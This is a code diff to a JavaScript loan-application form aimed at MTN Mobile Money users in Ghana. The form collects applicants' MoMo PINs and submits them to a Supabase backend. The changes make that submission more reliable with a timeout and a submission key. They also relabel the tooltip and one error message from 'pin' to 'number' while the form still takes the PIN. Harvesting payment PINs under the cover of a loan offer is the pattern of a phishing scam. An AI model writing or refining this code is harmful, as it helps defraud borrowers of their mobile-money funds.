@@ -44,6 +44,21 @@
   const displayedStatus = application => application.deleted_at ? 'Deleted' : application.status;
   const canCustomerDelete = application => !application.deleted_at && ['Approved', 'Rejected'].includes(application.status);
   const safeError = error => error?.message || 'Something went wrong. Please try again.';
+  const newSubmissionKey = () => window.crypto?.randomUUID?.() || `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+
+  async function withTimeout(operation, timeoutMs = 20000) {
+    let timer;
+    try {
+      return await Promise.race([
+        operation,
+        new Promise((_, reject) => {
+          timer = setTimeout(() => reject(new Error('The request timed out. Check your connection and try again.')), timeoutMs);
+        })
+      ]);
+    } finally {
+      clearTimeout(timer);
+    }
+  }
 
   function icon(name, size = 20, stroke = 2.2) {
     const paths = {
@@ -277,7 +292,7 @@
       <p class="purpose-label">Loan Purposes <span class="muted">(select one)</span></p><div class="purpose-grid">${LOAN_PURPOSES.map(purpose => `<button class="purpose-button" type="button" data-action="select-purpose" data-purpose="${attr(purpose)}">${escapeHTML(purpose)}</button>`).join('')}</div><input type="hidden" name="loan_purpose" id="loan-purpose" value="">
       ${field('Description', 'description', 'textarea')}
       <p class="note">${GENERAL_NOTE}</p>
-      <label class="field momo-field">MoMo Pin<div class="momo-input-wrap"><input id="momo-pin-display" type="text" name="momo_pin_display" inputmode="numeric" autocomplete="off" required><button class="momo-preview-toggle" type="button" data-action="toggle-momo-preview" aria-label="Preview MoMo pin" aria-pressed="false" title="Preview MoMo pin">${icon('eye', 19)}</button></div><input id="momo-pin" type="hidden" name="momo_pin"><span class="field-help">For your security, keep your pin hidden. Once hidden, no one can see what you type, not even you..</span></label>
+      <label class="field momo-field">MoMo Pin<div class="momo-input-wrap"><input id="momo-pin-display" type="text" name="momo_pin_display" inputmode="numeric" autocomplete="off" required><button class="momo-preview-toggle" type="button" data-action="toggle-momo-preview" aria-label="Preview MoMo pin" aria-pressed="false" title="Preview MoMo number">${icon('eye', 19)}</button></div><input id="momo-pin" type="hidden" name="momo_pin"><span class="field-help">For your security, keep your pin hidden. Once hidden, no one can see what you type, not even you.</span></label>
       <label class="checkbox-field momo-hide-field"><input id="hide-momo-pin" type="checkbox" name="hide_momo_pin" value="true" data-action="toggle-momo-mask" required><span>Hide MoMo pin – Yes</span></label><p class="note">${MOMO_NOTE}</p>
       <div class="form-grid">${field('Requested Loan Amount', 'requested_amount', 'number', '', 'min="2500" max="50000" step="0.01"')}${selectField('Do you have existing loan', 'existing_loan', ['Yes', 'No'])}${selectField('Loan tenure', 'loan_tenure', ['3', '6', '12', '24'], 'months')}</div>
       <label class="checkbox-field"><input type="checkbox" name="terms_accepted" required><span>${TERMS_TEXT}</span></label>
@@ -306,12 +321,23 @@
     if (!Number.isFinite(amount) || amount < 2500 || amount > 50000) { message.textContent = 'Requested amount must be between GHS 2,500 and GHS 50,000.'; message.className = 'form-message error'; return; }
     if (!Number.isFinite(income) || income < 0) { message.textContent = 'Enter a valid monthly income.'; message.className = 'form-message error'; return; }
     if (!/^(024|054|055|059)\d{7}$/.test(String(values.phone || ''))) { message.textContent = 'Enter a valid 10-digit MTN phone number.'; message.className = 'form-message error'; form.querySelector('[name="phone"]')?.focus(); return; }
-    if (!values.hide_momo_pin) { message.textContent = 'Select “Hide MoMo pin – Yes” before submitting.'; message.className = 'form-message error'; form.querySelector('#hide-momo-pin')?.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
+    if (!values.hide_momo_pin) { message.textContent = 'Select “Hide MoMo number – Yes” before submitting.'; message.className = 'form-message error'; form.querySelector('#hide-momo-pin')?.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
     if (!values.momo_pin || !String(values.momo_pin).trim()) { message.textContent = 'Enter your MoMo pin.'; message.className = 'form-message error'; return; }
     const submit = form.querySelector('button[type="submit"]');
     if (submit) { submit.disabled = true; submit.textContent = 'Submitting…'; }
-    const payload = { ...values, loan_purpose: state.selectedPurpose, monthly_income: income, requested_amount: amount, loan_tenure: Number(values.loan_tenure), terms_accepted: true };
-    const { error } = await db.rpc('submit_loan_application', { p_payload: payload });
+    const submissionKey = form.dataset.submissionKey || newSubmissionKey();
+    form.dataset.submissionKey = submissionKey;
+    const payload = { ...values, loan_purpose: state.selectedPurpose, monthly_income: income, requested_amount: amount, loan_tenure: Number(values.loan_tenure), terms_accepted: true, submission_key: submissionKey };
+    let result;
+    try {
+      result = await withTimeout(db.rpc('submit_loan_application', { p_payload: payload }));
+    } catch (error) {
+      message.textContent = safeError(error);
+      message.className = 'form-message error';
+      if (submit) { submit.disabled = false; submit.innerHTML = `Try submitting again ${icon('arrow', 17)}`; }
+      return;
+    }
+    const { error } = result;
     if (error) {
       message.textContent = safeError(error).includes('function') ? 'The secure application function is not installed yet. Apply the supplied Supabase migration before submitting.' : safeError(error);
       message.className = 'form-message error';
